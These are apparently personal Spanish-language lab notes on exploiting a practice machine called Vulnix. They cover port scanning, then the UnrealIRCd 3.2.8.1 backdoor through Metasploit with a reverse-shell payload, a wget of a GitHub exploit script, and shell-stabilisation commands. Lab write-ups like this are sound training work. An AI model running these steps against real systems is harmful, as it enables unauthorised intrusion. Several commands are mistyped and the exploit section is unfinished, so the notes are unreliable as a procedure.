#Reconocimiento
#Puerto80
#puerto6667
#reverseshell
#reverseshellpython
#escaladaPrivilegios

## reconocimiento en la red

![[Reconocimiento VulnixReal.png]]

IP Máquina  target: 192.168.1.140
## NMAP

![[Vulnix real nmap discover.png]]
Obtenemos que el epuerto 80 y puerto 22 esán abiertos
Puerto 80 es el puerto para servicio web
Puerto 22 es el puerto de SSH
Puerto 6667  --irc
Puerto 6697  --irc-u
Puerto 8067  --infi-async

Vemos la web que encontramos:

## revision puerto 80


![[Pasted image 20240306235939.png]]
Web es la web de apache 2 por defecto
Hacemos Gobuster para intentar encontrar  diferentes rutas de la web (por si existe algo fuera del index)


![[VulnixReal goobuster.png]]
Pero no encontramos nada
podemos seguir intentando fuzz y gobuster subdomains

De la web no sacamos nada
Pasamos al siguiente puerto 6667

 instantamos explotarlo con metaexploit:
 comandos 
 msfconsole
![[vulnix real msfconsole.png]]

y buscando un poco por internet vemos que es vulnerable con metaexploit: 
https://docs.rapid7.com/metasploit/metasploitable-2-exploitability-guide/
vamos a intentar explotarlo segun lo encontrado

![[searchUnreal vulnix real.png]]


Use 2
![[use2 vulnix real.png]]

Options
![[vulnix real options.png]]

set rhost = IP:
![[set rhjost vulnix real.png]]

set rport  6667

![[set report 6667 vulnix real.png]]

use exploit/unix/irc/unreal_ircd_3281_backdoor
![[vulnix real use exploit irc unreal.png]]

show payloads:
![[show payloads vulnix real.png]]

set payload reverse:
![[set pauload reverse vulnix real.png]]

set lhosts = local IP:
![[setlhost vulnix real.png]]


exploit
![[vulnix real exploit.png]]
but No sessions was created.

Buscando un poco por internet encontramos el repo de github

https://github.com/Ranger11Danger/UnrealIRCd-3.2.8.1-Backdoor

descargamos el exploit .py
wget https://github.com/Ranger11Danger/UnrealIRCd-3.2.8.1-Backdoor/blob/master/exploit.py

![[descargar exploit del repo de github.png]]
Exploit:: faltan pantallazos y comandos


Tratamiento de la TTI
script dev/null -c bash
CTRL + Z
stti raw -echo ; fg
reset
xterm
xport TERM = xterm
xport SHELL = bash
